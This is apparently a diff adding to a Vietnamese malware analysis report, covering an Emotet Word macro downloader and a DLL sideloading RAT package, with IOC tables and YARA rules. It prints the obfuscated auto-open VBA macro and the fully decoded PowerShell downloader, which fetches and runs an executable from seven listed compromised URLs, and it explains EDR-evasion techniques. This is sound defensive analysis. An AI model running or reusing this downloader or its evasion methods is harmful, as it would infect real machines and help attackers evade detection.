@@ -1700,7 +1700,301 @@ Từ 2 chứng cứ trên ta có thể xác định được luồng hoạt đ�
 [RedLeaves RAT chạy hoàn toàn trên RAM] (Chụp màn hình, trộm pass Firefox/DPAPI, kết nối C2)
 
 IOC và YARA RULE sẽ được đặt ở cuối
-MALware số 2 :
+MALware số 2 : 2.doc (Emotet Downloader)
+
+### 1. Phân tích tĩnh Macro OLE (Static Analysis)
+Mẫu ban đầu là tài liệu Word `2.doc` thuộc định dạng OLE2 Compound File. Khi kiểm tra bằng `olevba`, tài liệu chứa macro VBA độc hại được kích hoạt tự động qua sự kiện:
+```vb
+Private Sub Document_open()
+    Ot3jeffcid_.Tcd6nx18b11zqeo7l9
+End Sub
+```
+
+Macro sử dụng các kỹ thuật làm mờ (obfuscation):
+- **Chèn code rác toán học (Dead code):** Rải các biểu thức tính toán vô nghĩa (`klEP6Sq = ...`, `duFdpjP83 = ...`) và bẫy lỗi `On Error Resume Next` để gây rối mắt phân tích viên.
+- **Kỹ thuật phân tách chuỗi rác (Delimiter Junk Splitting):** Dùng chuỗi rác đặc trưng `(hsv 32(()hq gq721g()))) hsu0())`. Hàm `W_2kt58knmgixx05m` cắt bỏ chuỗi rác này bằng `Split` rồi `Join` lại để khôi phục xâu thực thi:
+  ```vb
+  Function W_2kt58knmgixx05m(Z59y9dd2upyqv4nmo)
+      Mofsgct8un8w0l = Split(Z59y9dd2upyqv4nmo, "(hsv 32(()hq gq721g()))) hsu0())")
+      W_2kt58knmgixx05m = Join(Mofsgct8un8w0l, "")
+  End Function
+  ```
+  Sau khi khử rác, chuỗi ghép lại là: `winmgmts:win32_process` và đối tượng `win32_processstartup` với thuộc tính `showwindow = 0` (ẩn toàn bộ giao diện dòng lệnh).
+- **Giấu payload trong thuộc tính Form ControlTipText:** Để né các bộ quét chữ ký tĩnh dò tìm chuỗi `powershell`, mã độc lưu toàn bộ câu lệnh thực thi trong tooltip của tab form (`Tabs(1).ControlTipText`).
+- **Thực thi ngầm qua WMI (MITRE ATT&CK: T1047):**
+  ```vb
+  CreateObject("winmgmts:Win32_Process").Create(Min6swuqek9ob, NULL, ProcessStartupConfig)
+  ```
+  Việc sử dụng WMI giúp cắt đứt quan hệ tiến trình cha - con trực tiếp giữa `WINWORD.EXE` và `powershell.exe`, nhằm né tránh luật phát hiện của các giải pháp EDR.
+
+---
+
+### 2. Phân tích động bằng Process Monitor (Procmon) & Bằng chứng thực nghiệm
+
+Khi theo dõi hoạt động hệ thống bằng Process Monitor với bộ lọc:
+- `Process Name is powershell.exe`
+- `Process Name is wmiprvse.exe`
+- `Process Name is WINWORD.EXE`
+
+Ta thu được các mắt xích thực thi theo đúng trình tự thời gian:
+
+#### a. Bắt quan hệ tiến trình WMI và câu lệnh ẩn
+Trong sự kiện `Process Create`, `wmiprvse.exe` (PID 3708 - WMI Provider Host) đứng ra sinh tiến trình `powershell.exe` (PID 7480) đi kèm tiến trình hỗ trợ console `conhost.exe 0xffffffff -ForceV1`.
+Trong tab **Process / Event Properties** của sự kiện, mục **Command line** ghi nhận nguyên văn câu lệnh:
+```cmd
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -e JABBAHUAagAwAHAAYgBtAD0AKAAnAE8AJwArACgAJwA2AGwAOQAnACsAJwAyAGYAYwAnACkAKQA...
+```
+
+#### b. Bắt dấu vết kết nối mạng (Network C2 Trace)
+Trong sự kiện `TCP Connect`, `powershell.exe` kết nối ra ngoài Internet tới máy chủ lưu trữ payload:
+- **Path:** `DESKTOP-EEUOBIV:50120 -> 144.99.107.86.netsons.net:http`
+- **Result:** `SUCCESS`
+- **Máy chủ đích:** IP `144.99.107.86` cổng `80` (Hạ tầng lưu trữ Web Hosting của Netsons s.r.l tại Ý), phân giải từ tên miền `dolphininsight.it`.
+
+---
+
+### 3. Giải mã kịch bản PowerShell (Stage 2 Payload)
+
+Chuỗi Base64 sau cờ `-e` được giải mã theo định dạng UTF-16LE:
+```powershell
+$b64 = "JABBAHUAagAwAHAAYgBtAD0AKAAnAE8AJwArACgAJwA2AGwAOQAnACsAJwAyAGYAYwAnACkAKQA..."
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64))
+```
+
+Nội dung kịch bản PowerShell gốc sau khi giải mã:
+```powershell
+# 1. Tạo thư mục tạm ngụy trang tên WORD\2019
+&('new-item') $env:Temp\WORD\2019\ -itemtype Directory;
+
+# 2. Bật giao thức mạng TLS 1.2, TLS 1.1, TLS 1.0 để tương thích kết nối HTTPS
+[Net.ServicePointManager]::SecurityProtocol = ('tls12, tls11, tls');
+
+# 3. Định nghĩa đường dẫn file thực thi đích
+$Hlttecc = $env:temp + '\WORD\2019\O1jp0j.exe';
+$Wket1s4 = &('new-object') Net.WebClient;
+
+# 4. Danh sách 7 máy chủ C2 / website WordPress bị xâm nhập (ngăn cách bởi dấu '*')
+$Smyttl7 = (
+    'https://dadieroque.com/wp-admin/dg/*' +
+    'https://sulselekspres.com/cgi-bin/6l0nyO/*' +
+    'https://maulanarumifoundation.com/RumiFoundation/Q9etF/*' +
+    'https://kelas.yec.co.id/srjns/B/*' +
+    'http://caesarmoving.com/wp-content/9s/*' +
+    'https://kinepremins.cl/wp-admin/6wr/*' +
+    'http://dolphininsight.it/wp-includes/LVf/'
+).Split([char]42);
+
+# 5. Vòng lặp tải xoay vòng và kiểm tra ngưỡng kích thước hợp lệ
+foreach ($Cgctt61 in $Smyttl7) {
+    try {
+        $Wket1s4.DownloadFile($Cgctt61, $Hlttecc);
+        # Điều kiện kiểm tra kích thước tối thiểu >= 39,850 bytes (đảm bảo file exe thực sự, tránh trang lỗi 404 HTML)
+        if ((&( 'Get-Item' ) $Hlttecc).length -ge 39850) {
+            .('Invoke-Item')($Hlttecc); # Thực thi payload Emotet
+            break;
+        }
+    } catch {}
+}
+```
+
+---
+
+### 4. Sơ đồ luồng hoạt động Mẫu 2
+
+```
+[2.doc (Tài liệu Word)]
+       │
+       ▼ (Người dùng mở file & Enable Content)
+[Document_Open() trong VBA Macro]
+       │ 1. Khử rác "(hsv 32(()hq gq721g()))) hsu0())"
+       │ 2. Lấy Base64 command trong ControlTipText
+       │ 3. Gọi Win32_Process.Create() với ShowWindow = 0
+       ▼
+[wmiprvse.exe (WMI Provider Host - PID 3708)]
+       │ (Sinh tiến trình con ngầm)
+       ▼
+[powershell.exe -e <Base64> (PID 7480)]
+       │ 1. Tạo thư mục %TEMP%\WORD\2019\
+       │ 2. Kết nối tới 144.99.107.86 (dolphininsight.it) qua HTTP port 80
+       │ 3. Tải file nhị phân kiểm tra kích thước >= 39,850 bytes
+       ▼
+[Kích hoạt mã độc thứ cấp: %TEMP%\WORD\2019\O1jp0j.exe]
+```
+
+---
+
+MALware số 3 : wss.exe + libcef.dll + config.ini (DLL Sideloading 64-bit)
+
+### 1. Phân tích cấu trúc bộ 3 thành phần
+Gói tấn công đại diện cho kỹ thuật APT DLL Sideloading (DLL Search Order Hijacking) trên nền tảng 64-bit:
+- **`wss.exe` (737,472 bytes - Clean Host):** Tệp thực thi hợp pháp nguyên bản từ bên thứ ba, phụ thuộc vào Chromium Embedded Framework (CEF) và khai báo nhập 35 hàm API từ thư viện `libcef.dll`.
+- **`libcef.dll` (243,712 bytes - Sideloading Proxy DLL):** Thư viện liên kết động độc hại (Trojan:Win32/Posilod), giả mạo DLL chính thống của CEF, xuất khẩu chính xác 35 hàm stub để khớp với IAT của `wss.exe`. Mã lệnh bên trong được làm mờ bằng OLLVM (Mixed Boolean Arithmetic & Control Flow Flattening).
+- **`config.ini` (307,200 bytes - Encrypted Payload):** Payload nhị phân đã bị mã hóa/obfuscate với kích thước cố định đúng 300 KB. 16 byte đầu tiên đóng vai trò Key Header (`05 44 34 66 9B 6F 64 8F E3 B7 17 9D AD CE 92 A7`).
+
+---
+
+### 2. Phân tích động bằng Process Monitor (Procmon)
+
+Khi giám sát tiến trình `wss.exe` trên Process Monitor (bộ lọc: `Process Name is wss.exe`), ta ghi nhận được toàn bộ chuỗi nạp DLL và payload:
+
+1. **Nạp DLL Sideloading:**
+   - `wss.exe` kích hoạt, tìm kiếm thư viện `libcef.dll` trong cùng thư mục hiện tại theo cơ chế DLL Search Order và nạp thành công (`CreateFile` / `Load Image` $\rightarrow$ `SUCCESS`).
+2. **Đọc và nạp Payload mã hóa vào RAM:**
+   - `libcef.dll` gọi API duyệt thư mục (`FindFirstFileExW` / `FindNextFileW`) định vị tệp `config.ini`.
+   - Thực hiện `CreateFile` và `ReadFile` toàn bộ 307,200 bytes của `config.ini` lên bộ nhớ tiến trình `wss.exe`.
+3. **Nạp các module hỗ trợ mạng & mật mã hệ thống:**
+   - Sau khi giải mã payload trong RAM, tiến trình nạp các thư viện:
+     - `WININET.dll`: Thư viện giao thức mạng HTTP/HTTPS kết nối C2.
+     - `cryptsp.dll`, `cryptbase.dll`, `rsaenh.dll`: Microsoft Enhanced Cryptographic Provider xử lý mã hóa dòng và bắt tay khóa bảo mật.
+     - `mswsock.dll`, `SspiCli.dll`: Giao tiếp socket tầng thấp và xử lý xác thực vượt proxy mạng doanh nghiệp.
+
+---
+
+### 3. Sơ đồ luồng hoạt động Mẫu 3
+
+```
+[wss.exe (Clean CEF Host)]
+       │ (Tự nạp theo DLL Search Order)
+       ▼
+[libcef.dll (Proxy Sideload 64-bit)]
+       │ 1. Khai báo 35 export stubs để tránh crash ứng dụng
+       │ 2. Tìm và nạp config.ini (300 KB) vào bộ đệm RAM
+       │ 3. Giải mã Shellcode và đổi thuộc tính trang nhớ sang PAGE_EXECUTE_READWRITE
+       ▼
+[Vùng nhớ RWX trong tiến trình wss.exe]
+       │ 1. Nạp WinINet.dll + rsaenh.dll + mswsock.dll
+       │ 2. Thiết lập kết nối mã hóa C2 âm thầm từ trong tiến trình hợp pháp
+       ▼
+[RAT Payload chạy hoàn toàn In-Memory né quét EDR]
+```
+
+---
+
+# III. Bảng Tổng Hợp Chỉ Số Nhận Diện (IOCs) & YARA Rules
+
+## 1. Bảng tổng hợp IOCs cả 3 mẫu
+
+| Mẫu | Tên file | Kích thước | SHA-256 | Dấu vết Host / Persistence | Network IOC / C2 |
+| :--- | :--- | :--- | :--- | :--- | :--- |
+| **Mẫu 1** | `123.exe` | 3,804,161 B | `66421690816c94bc0bef48b81520729df355d35adba6933cee93fc5b2f7a639b` | Mutex `cplusplus_me`, xả `%TEMP%\obedience.exe`, `StarBurn.dll`, `handkerchief.dat`, shortcut `persuasion.lnk` | HTTP POST `/index.php` (`clientid`, `__data`, `__serial`), Raw TCP socket |
+| **Mẫu 1 con** | `StarBurn.dll` | 134,144 B | `63d5aa72d8e0b55f59a1e28e53d2cc6f7f94ec978ec4690862fdadbde00a7ac0` | Sideloaded DLL proxy stubs | Nạp payload nội bộ |
+| **Mẫu 1 con** | `handkerchief.dat` | 254,593 B | `773b176b3a68c3d21fae907af8fba7908b55726bd591c5335c8c0bc9de179b76` | Payload mã hóa XOR chia đôi mảng | Chứa RedLeaves RAT PE |
+| **Mẫu 1 con** | `RedLeaves_RAT.exe`| 249,352 B | `b9d616b6db7cf7832fd68cb47a9b9753e55c1d8013b184f2c57b4f5fc6c12eea` | Trộm password Firefox SQLite, DPAPI `CryptUnprotectData`, chụp màn hình GDI | Socket `serverip`, `serverport`, `ReverseIpAddr`, `PortMappingSlave` |
+| **Mẫu 2** | `2.doc` | 220,553 B | `d5ce788fe908e1df5ca826179a3d5df41b1f1e441daf98c672e9b69a6fc3c7b8` | Thư mục `%TEMP%\WORD\2019\`, gọi WMI `Win32_Process`, file tải `%TEMP%\WORD\2019\O1jp0j.exe` | IP `144.99.107.86:80`, 7 website: `dolphininsight.it`, `dadieroque.com`, `sulselekspres.com`, `maulanarumifoundation.com`, `kelas.yec.co.id`, `caesarmoving.com`, `kinepremins.cl` |
+| **Mẫu 3** | `wss.exe` | 737,472 B | `97ed6221334e20650504e0ba8964687b66fcf89172a633ebcd6c1da09663405f` | Clean CEF Host | Sideloading target |
+| **Mẫu 3 con** | `libcef.dll` | 243,712 B | `d9bb10d2e612cf27c9f5bdfa39e0b62ac89f1dff89cb6a5f04a46d142b376fa7` | 35 CEF export stubs, OLLVM MBA obfuscation | Gọi `WININET.dll` kết nối C2 |
+| **Mẫu 3 con** | `config.ini` | 307,200 B | `c9bcdf3b0c1ee5c3585b14995800559ded06e842918ed7155a58d9138db7c1e0` | Payload nhị phân mã hóa 300 KB | Chứa Shellcode RAT trong RAM |
+
+---
+
+## 2. Bộ luật YARA (YARA Ruleset)
+
+```yara
+/*
+    YARA Ruleset for Malware Analysis Report - Samples 1, 2, 3
+    Targets: APT10 RedLeaves, Emotet Downloader, Posilod Sideloading
+*/
+
+rule APT10_RedLeaves_Dropper {
+    meta:
+        description = "Detects APT10 RedLeaves Dropper (123.exe)"
+        threat_actor = "APT10 (Stone Panda / MenuPass)"
+        malware_family = "RedLeaves"
+        hash_sha256 = "66421690816c94bc0bef48b81520729df355d35adba6933cee93fc5b2f7a639b"
+    strings:
+        $mutex = "cplusplus_me" ascii
+        $f1 = "obedience.exe" ascii
+        $f2 = "StarBurn.dll" ascii
+        $f3 = "handkerchief.dat" ascii
+        $xor_loop = { 8A 08 32 CA 88 08 40 3B C6 }
+    condition:
+        uint16(0) == 0x5A4D and (
+            ($mutex and 2 of ($f*)) or
+            ($xor_loop and 2 of ($f*))
+        )
+}
+
+rule APT10_RedLeaves_SideLoad_DLL {
+    meta:
+        description = "Detects malicious StarBurn.dll proxy stub used for DLL Sideloading"
+        threat_actor = "APT10 (Stone Panda / MenuPass)"
+        malware_family = "RedLeaves"
+        hash_sha256 = "63d5aa72d8e0b55f59a1e28e53d2cc6f7f94ec978ec4690862fdadbde00a7ac0"
+    strings:
+        $payload_name = "handkerchief.dat" ascii
+        $lnk_persist  = "persuasion.lnk" ascii
+        $export1 = "StarBurn_Create" ascii
+        $export2 = "StarBurn_Destroy" ascii
+    condition:
+        uint16(0) == 0x5A4D and (
+            ($payload_name and $lnk_persist) or
+            ($payload_name and all of ($export*))
+        )
+}
+
+rule APT10_RedLeaves_RAT_Payload {
+    meta:
+        description = "Detects RedLeaves RAT payload in memory or decrypted artifact"
+        threat_actor = "APT10 (Stone Panda / MenuPass)"
+        malware_family = "RedLeaves"
+        hash_sha256 = "b9d616b6db7cf7832fd68cb47a9b9753e55c1d8013b184f2c57b4f5fc6c12eea"
+    strings:
+        $http_uri = "index.php" wide
+        $param1 = "__data=" wide
+        $param2 = "__serial=" wide
+        $param3 = "__upt=" wide
+        $param4 = "__msgid=" wide
+        $param5 = "clientid=" wide
+        $cfg1 = "serverip" ascii
+        $cfg2 = "serverport" ascii
+        $cfg3 = "ReverseIpAddr" ascii
+        $rtti1 = ".?AVPortMappingSlave@@" ascii
+        $ff_sql = "select hostname, encryptedUsername, encryptedPassword from moz_logins" ascii
+        $ff_nss = "PK11_CheckUserPassword" ascii
+    condition:
+        3 of ($param*) or
+        (2 of ($cfg*) and $rtti1) or
+        $ff_sql or
+        ($ff_nss and $http_uri)
+}
+
+rule Emotet_Word_Macro_Downloader_2Doc {
+    meta:
+        description = "Detects Emotet VBA Downloader using WMI Win32_Process and ControlTipText Obfuscation"
+        threat_actor = "Emotet / TA542"
+        hash_sha256 = "d5ce788fe908e1df5ca826179a3d5df41b1f1e441daf98c672e9b69a6fc3c7b8"
+    strings:
+        $junk_str = "(hsv 32(()hq gq721g()))) hsu0())" ascii wide
+        $form1 = "Ot3jeffcid_" ascii wide
+        $form2 = "Om44_htfve2dp" ascii wide
+        $wmi = "win32_process" ascii nocase
+        $path_marker = "WORD\\2019" ascii wide
+    condition:
+        uint16(0) == 0xCFD0 and (
+            $junk_str or
+            (all of ($form*) and $wmi) or
+            ($path_marker and $wmi)
+        )
+}
+
+rule Posilod_Libcef_DLL_Sideloading {
+    meta:
+        description = "Detects malicious libcef.dll proxy stub used in 64-bit DLL Sideloading"
+        threat_actor = "Unknown / Posilod"
+        hash_sha256 = "d9bb10d2e612cf27c9f5bdfa39e0b62ac89f1dff89cb6a5f04a46d142b376fa7"
+    strings:
+        $exp1 = "cef_string_utf8_to_utf16" ascii
+        $exp2 = "cef_string_utf16_cmp" ascii
+        $exp3 = "cef_execute_process" ascii
+        $exp4 = "cef_api_hash" ascii
+        $exp5 = "cef_string_multimap_alloc" ascii
+    condition:
+        uint16(0) == 0x5A4D and
+        uint32(uint32(0x3C)) == 0x00004550 and
+        all of ($exp*)
+}
+```
+
 
 
 
